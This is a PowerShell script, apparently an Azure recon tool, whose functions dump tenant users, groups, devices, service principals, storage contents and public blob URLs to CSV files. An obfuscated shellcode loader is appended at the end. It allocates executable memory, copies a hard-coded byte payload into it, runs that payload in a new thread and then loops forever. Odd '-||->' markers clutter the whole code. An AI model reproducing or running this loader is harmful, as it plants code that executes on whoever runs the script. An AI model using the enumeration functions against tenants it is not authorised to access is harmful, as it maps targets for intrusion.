









 -||-> Function Dump-AzureDomainInfo-MSOL
{


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Folder to output to.")]
        [string]$folder
    )

    
     -||-> if ( -||-> $folder <-||- ){ -||-> if( -||-> Test-Path $folder <-||- ){ -||-> if( -||-> Test-Path $folder"\MSOL" <-||- ){}else{ -||-> New-Item -ItemType Directory $folder"\MSOL"|Out-Null <-||- } <-||- }else{ -||-> New-Item -ItemType Directory $folder|Out-Null <-||-  ;  -||-> New-Item -ItemType Directory $folder"\MSOL"|Out-Null <-||- } <-||- }
    else{ -||-> if( -||-> Test-Path MSOL <-||- ){}else{ -||-> New-Item -ItemType Directory MSOL|Out-Null <-||- } <-||- ; -||-> $folder=".\" <-||- } <-||- 

    
     -||-> Connect-MsolService <-||- 

    
     -||-> Write-Verbose "Getting Domain Contact Info..." <-||- 
     -||-> Get-MsolCompanyInformation | Out-File -LiteralPath $folder"\MSOL\DomainCompanyInfo.txt" <-||- 

    
     -||-> Write-Verbose "Getting Domains..." <-||- 
     -||-> $domains =  -||-> Get-MsolDomain <-||-  <-||-  
     -||-> $domains | select  Name,Status,Authentication | Export-Csv -NoTypeInformation -LiteralPath $folder"\MSOL\Domains.CSV" <-||- 
     -||-> $domainCount = $domains.Count <-||- 
     -||-> Write-Verbose "$domainCount Domains were found." <-||- 

    
     -||-> Write-Verbose "Getting Domain Users..." <-||- 
     -||-> $userCount=0 <-||- 
     -||-> $domains | select  Name | ForEach-Object { -||-> $DomainIter=$_.Name <-||- ;  -||-> $domainUsers= -||-> Get-MsolUser -All -DomainName $DomainIter <-||-  <-||- ;  -||-> $userCount+=$domainUsers.Count <-||- ;  -||-> $domainUsers | Select-Object @{Label= -||-> "Domain" <-||- ; Expression= -||-> { -||-> $DomainIter <-||- } <-||- },UserPrincipalName,DisplayName,isLicensed | Export-Csv -NoTypeInformation -LiteralPath $folder"\MSOL\"$DomainIter"_Users.CSV" <-||- } <-||- 
     -||-> Write-Verbose "$userCount Domain Users were found across $domainCount domains." <-||- 

    
     -||-> Write-Verbose "Getting Domain Groups..." <-||- 
     -||-> if( -||-> Test-Path $folder"\MSOL\Groups" <-||- ){}
    else{ -||-> New-Item -ItemType Directory $folder"\MSOL\Groups" | Out-Null <-||- } <-||- 
     -||-> $groups =  -||-> Get-MsolGroup -All -GroupType Security <-||-  <-||- 
     -||-> $groupCount = $groups.Count <-||- 
     -||-> Write-Verbose "$groupCount Domain Groups were found." <-||- 
     -||-> Write-Verbose "Getting Domain Users for each group..." <-||- 
     -||-> $groups | Export-Csv -NoTypeInformation -LiteralPath $folder"\MSOL\Groups.CSV" <-||- 
     -||-> $groups | ForEach-Object { -||-> $groupName=$_.DisplayName <-||- ;  -||-> Get-MsolGroupMember -All -GroupObjectId $_.ObjectID | Select-Object @{ Label =  -||-> "Group Name" <-||- ; Expression= -||-> { -||-> $groupName <-||- } <-||- }, EmailAddress, DisplayName | Export-Csv -NoTypeInformation -LiteralPath $folder"\MSOL\Groups\group_"$groupName"_Users.CSV" <-||- } <-||- 
     -||-> Write-Verbose "Domain Group Users were enumerated for $groupCount groups." <-||- 

    
     -||-> Write-Verbose "Getting Domain Devices..." <-||- 
     -||-> $devices =  -||-> Get-MsolDevice -All <-||-  <-||-  
     -||-> $devices | Export-Csv -NoTypeInformation -LiteralPath $folder"\MSOL\Domain_Devices.CSV" <-||- 
     -||-> $deviceCount = $devices.Count <-||- 
     -||-> Write-Verbose "$deviceCount devices were enumerated." <-||- 


    
     -||-> Write-Verbose "Getting Domain Service Principals..." <-||- 
     -||-> $principals =  -||-> Get-MsolServicePrincipal -All <-||-  <-||- 
     -||-> $principals | Export-Csv -NoTypeInformation -LiteralPath $folder"\MSOL\Domain_SPNs.CSV" <-||- 
     -||-> $principalCount = $principals.Count <-||- 
     -||-> Write-Verbose "$principalCount service principals were enumerated." <-||- 


     -||-> Write-Verbose "All done with MSOL tasks.`n" <-||- 
} <-||- 

 -||-> Function Dump-AzureDomainInfo-AzureRM
{


    
    
    
    


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Folder to output to.")]
        [string]$folder
    )

    
     -||-> if ( -||-> $folder <-||- ){ -||-> if( -||-> Test-Path $folder <-||- ){ -||-> if( -||-> Test-Path $folder"\AzureRM" <-||- ){}else{ -||-> New-Item -ItemType Directory $folder"\AzureRM"|Out-Null <-||- } <-||- }else{ -||-> New-Item -ItemType Directory $folder|Out-Null <-||-  ;  -||-> New-Item -ItemType Directory $folder"\AzureRM"|Out-Null <-||- } <-||- }
    else{ -||-> if( -||-> Test-Path AzureRM <-||- ){}else{ -||-> New-Item -ItemType Directory AzureRM|Out-Null <-||- } <-||- ; -||-> $folder=".\" <-||- } <-||- 

    
     -||-> Login-AzureRmAccount <-||- 

    
     -||-> $tenantID =  -||-> Get-AzureRmTenant | select TenantId <-||-  <-||- 

    
     -||-> Write-Verbose "Getting Domain Users..." <-||- 
     -||-> $userCount=0 <-||- 
     -||-> $users= -||-> Get-AzureRmADUser <-||-  <-||-  
     -||-> $users | Export-Csv -NoTypeInformation -LiteralPath $folder"\AzureRM\Users.CSV" <-||- 
     -||-> $userCount=$users.Count <-||- 
     -||-> Write-Verbose "$userCount Domain Users were found." <-||- 

    
     -||-> Write-Verbose "Getting Domain Groups..." <-||- 
     -||-> if( -||-> Test-Path $folder"\AzureRM\Groups" <-||- ){}
    else{ -||-> New-Item -ItemType Directory $folder"\AzureRM\Groups" | Out-Null <-||- } <-||- 
     -||-> $groups= -||-> Get-AzureRmADGroup <-||-  <-||- 
     -||-> $groupCount = $groups.Count <-||- 
     -||-> Write-Verbose "$groupCount Domain Groups were found." <-||- 
     -||-> Write-Verbose "Getting Domain Users for each group..." <-||- 
     -||-> $groups | Export-Csv -NoTypeInformation -LiteralPath $folder"\AzureRM\Groups.CSV" <-||- 
     -||-> $groups | ForEach-Object { -||-> $groupName=$_.DisplayName <-||- ;  -||-> Get-AzureRmADGroupMember -GroupObjectId $_.Id | Select-Object @{ Label =  -||-> "Group Name" <-||- ; Expression= -||-> { -||-> $groupName <-||- } <-||- }, DisplayName | Export-Csv -NoTypeInformation -LiteralPath $folder"\AzureRM\Groups\group_"$groupName"_Users.CSV" <-||- } <-||- 
     -||-> Write-Verbose "Domain Group Users were enumerated for $groupCount group(s)." <-||- 

    
    
    
    
     -||-> $storageAccounts =  -||-> Get-AzureRmStorageAccount | select StorageAccountName,ResourceGroupName <-||-  <-||-  
    
     -||-> if( -||-> Test-Path $folder"\AzureRM\Files" <-||- ){}
    else{ -||-> New-Item -ItemType Directory $folder"\AzureRM\Files" | Out-Null <-||- } <-||- 

     -||-> Foreach ($storageAccount in  -||-> $storageAccounts <-||- ){
         -||-> $StorageAccountName = $storageAccount.StorageAccountName <-||- 
         -||-> Write-Verbose "Listing out blob files for the $StorageAccountName storage account..." <-||- 
        
         -||-> Set-AzureRmCurrentStorageAccount -ResourceGroupName $storageAccount.ResourceGroupName -Name $storageAccount.StorageAccountName | Out-Null <-||- 

         -||-> $strgName = $storageAccount.StorageAccountName <-||- 

        
         -||-> if( -||-> Test-Path $folder"\AzureRM\Files\"$strgName <-||- ){}
        else{ -||-> New-Item -ItemType Directory $folder"\AzureRM\Files\"$strgName | Out-Null <-||- } <-||- 

        
         -||-> $containers =  -||-> Get-AzureStorageContainer | select Name <-||-  <-||- 
        
         -||-> foreach ($container in  -||-> $containers <-||- ){
             -||-> $containerName = $container.Name <-||- 
             -||-> Write-Verbose "`tListing files for the $containerName container" <-||- 
             -||-> $pathName = "\AzureRM\Files\"+$strgName+"\Blob_Files_"+$container.Name <-||- 
             -||-> Get-AzureStorageBlob -Container $container.Name | Export-Csv -NoTypeInformation -LiteralPath $folder$pathName".CSV" <-||- 
            
            
             -||-> $publicStatus =  -||-> Get-AzureStorageContainerAcl $container.Name | select PublicAccess <-||-  <-||- 
             -||-> if ( -||-> ( -||-> $publicStatus.PublicAccess -eq "Blob" <-||- ) -or ( -||-> $publicStatus.PublicAccess -eq "Container" <-||- ) <-||- ){
                 -||-> Write-Verbose "`t`tPublic File Found" <-||-  
                
                 -||-> $blobName =  -||-> Get-AzureStorageBlob -Container $container.Name | select Name <-||-  <-||- 
                 -||-> $blobUrl = "https://$StorageAccountName.blob.core.windows.net/$containerName/"+$blobName.Name <-||- 
                 -||-> $blobUrl >> $folder"\AzureRM\Files\"$strgName"\PublicFileURLs.txt" <-||- 
                } <-||- 
        } <-||- 

        
         -||-> Try{
             -||-> $AZFileShares =  -||-> Get-AzureStorageShare -ErrorAction Stop | select Name <-||-  <-||- 
             -||-> Write-Verbose "Listing out File Service files for the $StorageAccountName storage account..." <-||- 
             -||-> foreach ($share in  -||-> $AZFileShares <-||- ) {
                 -||-> $shareName = $share.Name <-||- 
                 -||-> Write-Verbose "`tListing files for the $shareName share" <-||- 
                 -||-> Get-AzureStorageFile -ShareName $shareName | select Name | Export-Csv -NoTypeInformation -LiteralPath $folder"\AzureRM\Files\"$strgName"\File_Service_Files-"$shareName".CSV" -Append <-||- 
                } <-||- 
            }
        Catch{
             -||-> Write-Verbose "No available File Service files for the $StorageAccountName storage account..." <-||- 
            }
        finally{
             -||-> $ErrorActionPreference = "Continue" <-||- 
            } <-||- 

        
         -||-> Try{            
             -||-> $tableList =  -||-> Get-AzureStorageTable -ErrorAction Stop <-||-  <-||-  
             -||-> if ( -||-> $tableList.Length -gt 0 <-||- ){
                 -||-> $tableList | Export-Csv -NoTypeInformation -LiteralPath $folder"\AzureRM\Files\"$strgName"\Data_Tables.CSV" <-||- 
                 -||-> Write-Verbose "Listing out Data Tables for the $StorageAccountName storage account..." <-||- 
                }
            else { -||-> Write-Verbose "No available Data Tables for the $StorageAccountName storage account..." <-||- } <-||- 
            }
        Catch{
             -||-> Write-Verbose "No available Data Tables for the $StorageAccountName storage account..." <-||- 
            }
        finally{
             -||-> $ErrorActionPreference = "Continue" <-||- 
            } <-||- 

    } <-||- 

    
     -||-> Write-Verbose "Getting Domain Service Principals..." <-||- 
     -||-> $principals =  -||-> Get-AzureRmADServicePrincipal <-||-  <-||- 
     -||-> $principals | Export-Csv -NoTypeInformation -LiteralPath $folder"\AzureRM\Domain_SPNs.CSV" <-||- 
     -||-> $principalCount = $principals.Count <-||- 
     -||-> Write-Verbose "$principalCount service principals were enumerated." <-||- 
    

     -||-> Write-Verbose "All done with AzureRM tasks.`n" <-||- 
} <-||- 

 -||-> Function Dump-AzureDomainInfo-All
{
    
        [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Folder to output to.")]
        [string]$folder
    )
     -||-> if( -||-> $folder <-||- ){
         -||-> Dump-AzureDomainInfo-MSOL -folder $folder <-||- 
         -||-> Dump-AzureDomainInfo-AzureRM -folder $folder <-||- 
    }
    else{
         -||-> Dump-AzureDomainInfo-MSOL <-||- 
         -||-> Dump-AzureDomainInfo-AzureRM <-||- 
    } <-||- 
} <-||- 

 -||-> $P00C = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $P00C -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbd,0x9c,0xd7,0x69,0xa9,0xdb,0xce,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x68,0x13,0x03,0x68,0x13,0x83,0xe8,0x60,0x35,0x9c,0x55,0x70,0x38,0x5f,0xa6,0x80,0x5d,0xe9,0x43,0xb1,0x5d,0x8d,0x00,0xe1,0x6d,0xc5,0x45,0x0d,0x05,0x8b,0x7d,0x86,0x6b,0x04,0x71,0x2f,0xc1,0x72,0xbc,0xb0,0x7a,0x46,0xdf,0x32,0x81,0x9b,0x3f,0x0b,0x4a,0xee,0x3e,0x4c,0xb7,0x03,0x12,0x05,0xb3,0xb6,0x83,0x22,0x89,0x0a,0x2f,0x78,0x1f,0x0b,0xcc,0xc8,0x1e,0x3a,0x43,0x43,0x79,0x9c,0x65,0x80,0xf1,0x95,0x7d,0xc5,0x3c,0x6f,0xf5,0x3d,0xca,0x6e,0xdf,0x0c,0x33,0xdc,0x1e,0xa1,0xc6,0x1c,0x66,0x05,0x39,0x6b,0x9e,0x76,0xc4,0x6c,0x65,0x05,0x12,0xf8,0x7e,0xad,0xd1,0x5a,0x5b,0x4c,0x35,0x3c,0x28,0x42,0xf2,0x4a,0x76,0x46,0x05,0x9e,0x0c,0x72,0x8e,0x21,0xc3,0xf3,0xd4,0x05,0xc7,0x58,0x8e,0x24,0x5e,0x04,0x61,0x58,0x80,0xe7,0xde,0xfc,0xca,0x05,0x0a,0x8d,0x90,0x41,0xff,0xbc,0x2a,0x91,0x97,0xb7,0x59,0xa3,0x38,0x6c,0xf6,0x8f,0xb1,0xaa,0x01,0xf0,0xeb,0x0b,0x9d,0x0f,0x14,0x6c,0xb7,0xcb,0x40,0x3c,0xaf,0xfa,0xe8,0xd7,0x2f,0x03,0x3d,0x4d,0x35,0x93,0xd7,0x0d,0x19,0x6d,0x40,0x30,0x62,0x70,0x2b,0xbd,0x84,0x22,0x1b,0xee,0x18,0x82,0xcb,0x4e,0xc9,0x6a,0x06,0x41,0x36,0x8a,0x29,0x8b,0x5f,0x20,0xc6,0x62,0x37,0xdc,0x7f,0x2f,0xc3,0x7d,0x7f,0xe5,0xa9,0xbd,0x0b,0x0a,0x4d,0x73,0xfc,0x67,0x5d,0xe3,0x0c,0x32,0x3f,0xa5,0x13,0xe8,0x2a,0x49,0x86,0x17,0xfd,0x1e,0x3e,0x1a,0xd8,0x68,0xe1,0xe5,0x0f,0xe3,0x28,0x70,0xf0,0x9b,0x54,0x94,0xf0,0x5b,0x03,0xfe,0xf0,0x33,0xf3,0x5a,0xa3,0x26,0xfc,0x76,0xd7,0xfb,0x69,0x79,0x8e,0xa8,0x3a,0x11,0x2c,0x97,0x0d,0xbe,0xcf,0xf2,0x8f,0x82,0x19,0x3a,0xfa,0xea,0x99 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $f5t=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $f5t.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$f5t,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



